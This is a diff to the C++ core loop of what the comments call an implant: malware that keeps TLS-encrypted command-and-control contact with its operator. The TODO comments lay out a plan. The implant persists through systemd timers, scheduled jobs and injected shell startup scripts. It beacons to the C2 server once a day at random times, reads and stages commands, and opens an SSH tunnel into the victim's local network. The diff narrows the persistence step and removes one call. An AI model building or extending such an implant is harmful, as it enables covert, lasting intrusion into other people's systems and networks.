@@ -32,11 +32,8 @@ void Core::loop() {
     /* TODO
      * at this point, the implant has established C2 communication (over TLS), and the initial persistence routines have run;
      *
-     * 1. conditional: if established_persistence_count < 1: extra_persistence_routines()
-     *      - this will establish persistence via scheduled job and injecting startup scripts (bash, zsh, ash, etc.)
-     *              - echo $SHELL or "ps -p $$ -o comm="
-     *              - scheduled_job_persistence()
-     *              - startup_script_persistence()
+     * 1. conditional: if established_persistence_count < 1: scheduled_job_persistence()
+     *      - scheduled_job_persistence() should establish persistence via systemd timer
      * 2. establish a loop to reach back out to the C2 channel once every 24 hours at a random interval throughout the day:
      *      - confirm contact
      *      - decode and read instruction       -> instruction should be of the form: COMMAND : file_to_stage
@@ -51,7 +48,7 @@ void Core::loop() {
      *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
      *      
     */
-    extra_persistence_routines(established_persistence_count);
+    
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
                                             // consult for further changes: https://github.com/yhirose/cpp-httplib
